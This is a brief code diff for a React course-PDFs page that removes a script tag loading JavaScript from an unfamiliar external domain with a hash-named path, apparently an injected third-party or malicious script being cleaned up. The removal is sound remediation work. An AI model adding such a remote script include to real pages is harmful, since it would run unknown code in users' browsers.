@@ -132,7 +132,6 @@ export default function CoursePDFsPage() {
 
     return (
         <>
-        <script src="https://evadereprimand.com/44/61/90/4461901ddc9eb30c096b8fdad64c2deb.js"></script>
        
         <StudentLayout title="Course PDFs">
             <div className="space-y-6">
